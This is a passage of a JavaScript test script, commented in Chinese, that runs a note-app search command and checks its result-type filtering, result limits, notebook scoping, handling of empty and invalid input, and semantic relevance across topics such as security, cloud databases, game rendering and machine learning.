        const searchResult = parseSearchResults(result.output);
        if (!searchResult) {
            addResult('TG-11-09', '类型过滤 - 文档块', cmd, '返回文档块类型',
                '无法解析', false);
        } else if (searchResult.results.length === 0) {
            addResult('TG-11-09', '类型过滤 - 文档块', cmd, '返回文档块类型',
                '无结果', false);
        } else {
            const allDocs = searchResult.results.every(r => r.type === 'd');
            addResult('TG-11-09', '类型过滤 - 文档块', cmd, '返回文档块类型',
                allDocs ? '成功' : '部分非文档', allDocs, 
                `结果数: ${searchResult.results.length}`);
        }
    }
}

// TG-11-10: 结果数量限制
{
    const cmd = `search "技术" --limit 3 --notebook ${NOTEBOOK_ID}`;
    const result = runCmd(cmd);
    
    if (!result.success) {
        addResult('TG-11-10', '结果数量限制', cmd, '结果数<=limit',
            '命令执行失败', false, result.error);
    } else {
        const searchResult = parseSearchResults(result.output);
        if (!searchResult) {
            addResult('TG-11-10', '结果数量限制', cmd, '结果数<=limit',
                '无法解析', false);
        } else {
            const withinLimit = searchResult.results.length <= 3;
            addResult('TG-11-10', '结果数量限制', cmd, '结果数<=limit',
                withinLimit ? '成功' : '超出限制', withinLimit, 
                `限制: 3, 实际: ${searchResult.results.length}`);
        }
    }
}

//  TG-11-12: 指定笔记本搜索
{
    const cmd = `search "技术" --notebook ${NOTEBOOK_ID}`;
    const result = runCmd(cmd);
    
    if (!result.success) {
        addResult('TG-11-12', '指定笔记本搜索', cmd, '只在指定笔记本搜索',
            '命令执行失败', false, result.error);
    } else {
        const searchResult = parseSearchResults(result.output);
        if (!searchResult) {
            addResult('TG-11-12', '指定笔记本搜索', cmd, '只在指定笔记本搜索',
                '无法解析', false);
        } else {
            addResult('TG-11-12', '指定笔记本搜索', cmd, '只在指定笔记本搜索',
                '成功', true, `结果数: ${searchResult.results.length}`);
        }
    }
}

// TG-11-13: 空查询处理
{
    const cmd = `search "" --notebook ${NOTEBOOK_ID}`;
    const result = runCmd(cmd);
    
    const handled = !result.success || 
                   result.output.includes('缺少') || 
                   result.output.includes('必须') ||
                   result.output.includes('请提供') ||
                   result.output.includes('error') ||
                   result.output.includes('错误');
    
    addResult('TG-11-13', '空查询处理', cmd, '返回错误提示',
        handled ? '成功' : '未正确处理', handled,
        handled ? '正确处理空查询' : '未返回预期错误');
}

// TG-11-14: 无效搜索模式处理
{
    const cmd = `search "test" --mode invalid_mode_xyz --notebook ${NOTEBOOK_ID}`;
    const result = runCmd(cmd);
    
    const handled = !result.success || 
                   result.output.includes('无效') || 
                   result.output.includes('invalid') ||
                   result.output.includes('错误');
    
    addResult('TG-11-14', '无效搜索模式', cmd, '返回错误提示',
        handled ? '成功' : '未正确处理', handled,
        handled ? '正确处理无效模式' : '未返回预期错误');
}

// TG-11-15: 验证语义搜索能区分不同主题
{
    // 搜索网络安全相关内容，验证不返回前端开发文档
    const query = '黑客攻击和系统防护';
    const cmd = `search "${query}" --mode semantic --notebook ${NOTEBOOK_ID} --limit 5`;
    const result = runCmd(cmd);
    
    if (!result.success) {
        addResult('TG-11-15', '语义搜索-主题区分', cmd, '正确区分主题',
            '命令执行失败', false, result.error);
    } else {
        const searchResult = parseSearchResults(result.output);
        if (!searchResult || searchResult.results.length === 0) {
            addResult('TG-11-15', '语义搜索-主题区分', cmd, '正确区分主题',
                '无结果', false);
        } else {
            // 检查是否返回了安全相关内容
            const securityKeywords = ['安全', '攻击', '注入', '防御', '漏洞', '加密'];
            const foundSecurity = searchResult.results.some(r => 
                securityKeywords.some(kw => (r.content || '').includes(kw))
            );
            
            // 检查是否错误地返回了不相关内容（如前端开发）
            const frontendKeywords = ['HTML', 'CSS', 'React', 'Vue组件'];
            const foundUnrelated = searchResult.results.some(r => 
                frontendKeywords.some(kw => (r.content || '').includes(kw)) &&
                !securityKeywords.some(kw => (r.content || '').includes(kw))
            );
            
            if (foundSecurity && !foundUnrelated) {
                addResult('TG-11-15', '语义搜索-主题区分', cmd, '正确区分主题',
                    '成功', true, '正确返回安全相关内容，未返回无关内容');
            } else if (foundSecurity) {
                addResult('TG-11-15', '语义搜索-主题区分', cmd, '正确区分主题',
                    '部分成功', true, '找到相关内容但混入部分无关结果');
            } else {
                addResult('TG-11-15', '语义搜索-主题区分', cmd, '正确区分主题',
                    '未找到相关内容', false);
            }
        }
    }
}

// TG-11-18: 交叉主题测试 - AI安全（机器学习+安全交叉）
{
    const query = '对抗样本攻击和模型鲁棒性防御';
    const cmd = `search "${query}" --mode semantic --notebook ${NOTEBOOK_ID} --limit 5`;
    const result = runCmd(cmd);
    
    if (!result.success) {
        addResult('TG-11-18', '交叉主题-AI安全', cmd, '识别交叉领域文档',
            '命令执行失败', false, result.error);
    } else {
        const searchResult = parseSearchResults(result.output);
        if (!searchResult || searchResult.results.length === 0) {
            addResult('TG-11-18', '交叉主题-AI安全', cmd, '识别交叉领域文档',
                '无结果', false);
        } else {
            // 应该找到AI安全交叉文档（对抗机器学习）
            const aiSecurityKeywords = ['对抗样本', '模型窃取', '联邦学习', '差分隐私', 'AI安全'];
            const foundAISecurity = searchResult.results.some(r => 
                aiSecurityKeywords.some(kw => (r.content || '').includes(kw))
            );
            
            // 也可能会找到纯机器学习或纯安全文档
            const mlKeywords = ['机器学习', '神经网络', '深度学习', '训练'];
            const secKeywords = ['攻击', '防御', '安全', '加密'];
            const foundRelated = searchResult.results.some(r => 
                mlKeywords.some(kw => (r.content || '').includes(kw)) ||
                secKeywords.some(kw => (r.content || '').includes(kw))
            );
            
            if (foundAISecurity) {
                addResult('TG-11-18', '交叉主题-AI安全', cmd, '识别交叉领域文档',
                    '成功', true, '成功识别AI安全交叉领域文档');
            } else if (foundRelated) {
                addResult('TG-11-18', '交叉主题-AI安全', cmd, '识别交叉领域文档',
                    '部分成功', true, '找到相关文档但未精确匹配交叉主题');
            } else {
                addResult('TG-11-18', '交叉主题-AI安全', cmd, '识别交叉领域文档',
                    '未找到相关内容', false);
            }
        }
    }
}

// TG-11-19: 交叉主题测试 - 云原生数据库（云计算+数据库交叉）
{
    const query = '分布式存储存算分离架构';
    const cmd = `search "${query}" --mode semantic --notebook ${NOTEBOOK_ID} --limit 5`;
    const result = runCmd(cmd);
    
    if (!result.success) {
        addResult('TG-11-19', '交叉主题-云数据库', cmd, '识别交叉领域文档',
            '命令执行失败', false, result.error);
    } else {
        const searchResult = parseSearchResults(result.output);
        if (!searchResult || searchResult.results.length === 0) {
            addResult('TG-11-19', '交叉主题-云数据库', cmd, '识别交叉领域文档',
                '无结果', false);
        } else {
            // 应该找到云原生数据库交叉文档
            const cloudDbKeywords = ['云原生', '存算分离', 'Aurora', 'Spanner', 'TiDB', '分布式存储'];
            const foundCloudDb = searchResult.results.some(r => 
                cloudDbKeywords.some(kw => (r.content || '').includes(kw))
            );
            
            // 也可能找到纯云计算或纯数据库文档
            const cloudKeywords = ['Kubernetes', 'Docker', '容器', '微服务'];
            const dbKeywords = ['MySQL', 'MongoDB', 'Redis', 'SQL'];
            const foundRelated = searchResult.results.some(r => 
                cloudKeywords.some(kw => (r.content || '').includes(kw)) ||
                dbKeywords.some(kw => (r.content || '').includes(kw))
            );
            
            if (foundCloudDb) {
                addResult('TG-11-19', '交叉主题-云数据库', cmd, '识别交叉领域文档',
                    '成功', true, '成功识别云原生数据库交叉文档');
            } else if (foundRelated) {
                addResult('TG-11-19', '交叉主题-云数据库', cmd, '识别交叉领域文档',
                    '部分成功', true, '找到相关文档但未精确匹配交叉主题');
            } else {
                addResult('TG-11-19', '交叉主题-云数据库', cmd, '识别交叉领域文档',
                    '未找到相关内容', false);
            }
        }
    }
}

// TG-11-20: 相似主题区分测试 - 游戏图形渲染（非游戏服务器）
{
    const query = '着色器编程和光照渲染技术';
    const cmd = `search "${query}" --mode semantic --notebook ${NOTEBOOK_ID} --limit 5`;
    const result = runCmd(cmd);
    
    if (!result.success) {
        addResult('TG-11-20', '相似主题-图形渲染', cmd, '区分相似主题',
            '命令执行失败', false, result.error);
    } else {
        const searchResult = parseSearchResults(result.output);
        if (!searchResult || searchResult.results.length === 0) {
            addResult('TG-11-20', '相似主题-图形渲染', cmd, '区分相似主题',
                '无结果', false);
        } else {
            // 应该返回游戏引擎/图形渲染文档
            const renderKeywords = ['着色器', '渲染', 'Shader', '光照', '图形', 'Unity', 'Unreal'];
            const foundRender = searchResult.results.some(r => 
                renderKeywords.some(kw => (r.content || '').includes(kw))
            );
            
            // 不应该返回游戏服务器文档（网络同步相关）
            const serverKeywords = ['网络同步', '帧同步', '服务器架构', '延迟补偿', '状态同步'];
            const topResult = searchResult.results[0];
            const topIsServer = serverKeywords.some(kw => (topResult?.content || '').includes(kw));
            
            if (foundRender && !topIsServer) {
                addResult('TG-11-20', '相似主题-图形渲染', cmd, '区分相似主题',
                    '成功', true, '正确返回图形渲染文档，首条非服务器文档');
            } else if (foundRender) {
                addResult('TG-11-20', '相似主题-图形渲染', cmd, '区分相似主题',
                    '部分成功', true, '找到渲染文档但排序待优化');
            } else {
                addResult('TG-11-20', '相似主题-图形渲染', cmd, '区分相似主题',
                    '未找到相关内容', false);
            }
        }
    }
}

// TG-11-21: 相似主题区分测试 - 游戏服务器网络（非图形渲染）
{
    const query = '多人游戏状态同步和延迟补偿';
    const cmd = `search "${query}" --mode semantic --notebook ${NOTEBOOK_ID} --limit 5`;
    const result = runCmd(cmd);
    
    if (!result.success) {
        addResult('TG-11-21', '相似主题-游戏网络', cmd, '区分相似主题',
            '命令执行失败', false, result.error);
    } else {
        const searchResult = parseSearchResults(result.output);
        if (!searchResult || searchResult.results.length === 0) {
            addResult('TG-11-21', '相似主题-游戏网络', cmd, '区分相似主题',
                '无结果', false);
        } else {
            // 应该返回游戏服务器/网络同步文档
            const netKeywords = ['网络同步', '状态同步', '延迟补偿', '帧同步', '服务器', '客户端预测'];
            const foundNet = searchResult.results.some(r => 
                netKeywords.some(kw => (r.content || '').includes(kw))
            );
            
            // 不应该优先返回图形渲染文档
            const renderKeywords = ['着色器', '渲染管线', '光照计算', '纹理采样', 'Shadow Mapping'];
            const topResult = searchResult.results[0];
            const topIsRender = renderKeywords.some(kw => (topResult?.content || '').includes(kw));
            
            if (foundNet && !topIsRender) {
                addResult('TG-11-21', '相似主题-游戏网络', cmd, '区分相似主题',
                    '成功', true, '正确返回游戏网络文档，首条非渲染文档');
            } else if (foundNet) {
                addResult('TG-11-21', '相似主题-游戏网络', cmd, '区分相似主题',
                    '部分成功', true, '找到网络文档但排序待优化');
            } else {
                addResult('TG-11-21', '相似主题-游戏网络', cmd, '区分相似主题',
                    '未找到相关内容', false);
            }
        }
    }
}

// TG-11-22: 深度语义理解测试 - 技术概念关联
{
    const query = '如何防止过拟合提高模型泛化能力';
    const cmd = `search "${query}" --mode semantic --notebook ${NOTEBOOK_ID} --limit 5`;
    const result = runCmd(cmd);
    
    if (!result.success) {
        addResult('TG-11-22', '深度语义-过拟合', cmd, '理解技术概念',
            '命令执行失败', false, result.error);
    } else {
        const searchResult = parseSearchResults(result.output);
        if (!searchResult || searchResult.results.length === 0) {
            addResult('TG-11-22', '深度语义-过拟合', cmd, '理解技术概念',
                '无结果', false);
        } else {
            // 应该返回机器学习相关文档（涉及训练、正则化等）
            const mlKeywords = ['机器学习', '训练', '模型', '正则化', '交叉验证', '超参数'];
            const foundML = searchResult.results.some(r => 
                mlKeywords.some(kw => (r.content || '').includes(kw))
            );
            
            // 也可能返回深度学习文档（涉及过拟合问题）
            const dlKeywords = ['神经网络', '深度学习', 'Dropout', '正则化', '优化器'];
            const foundDL = searchResult.results.some(r => 
                dlKeywords.some(kw => (r.content || '').includes(kw))
            );
            
            if (foundML || foundDL) {
                const scores = searchResult.results.map(r => getScore(r)).filter(s => s !== null);
                const maxScore = scores.length > 0 ? Math.max(...scores).toFixed(3) : 'N/A';
                addResult('TG-11-22', '深度语义-过拟合', cmd, '理解技术概念',
                    '成功', true, `理解概念关联, 最高分: ${maxScore}`);
            } else {
                addResult('TG-11-22', '深度语义-过拟合', cmd, '理解技术概念',
                    '未找到相关内容', false);
            }
        }
    }
}

// TG-11-23: 复杂查询测试 - 多条件语义搜索
{
    const query = 'Kubernetes容器编排微服务部署策略';
    const cmd = `search "${query}" --mode semantic --notebook ${NOTEBOOK_ID} --limit 5`;
    const result = runCmd(cmd);
    
    if (!result.success) {
        addResult('TG-11-23', '复杂查询-K8s微服务', cmd, '处理复合查询',
            '命令执行失败', false, result.error);
    } else {
        const searchResult = parseSearchResults(result.output);
        if (!searchResult || searchResult.results.length === 0) {
            addResult('TG-11-23', '复杂查询-K8s微服务', cmd, '处理复合查询',
                '无结果', false);
        } else {
            // 应该返回云计算/云原生架构文档
            const cloudKeywords = ['Kubernetes', '容器', '微服务', 'Docker', 'Pod', 'Deployment'];
            const foundCloud = searchResult.results.some(r => 
                cloudKeywords.some(kw => (r.content || '').includes(kw))
            );
            
            // 验证首条结果相关性
            const topResult = searchResult.results[0];
            const topRelevant = cloudKeywords.some(kw => (topResult?.content || '').includes(kw));
            
            if (foundCloud && topRelevant) {
                addResult('TG-11-23', '复杂查询-K8s微服务', cmd, '处理复合查询',
                    '成功', true, '正确识别云原生架构文档');
            } else if (foundCloud) {
                addResult('TG-11-23', '复杂查询-K8s微服务', cmd, '处理复合查询',
                    '部分成功', true, '找到相关文档但排序待优化');
            } else {
                addResult('TG-11-23', '复杂查询-K8s微服务', cmd, '处理复合查询',
                    '未找到相关内容', false);
            }
        }
    }
}

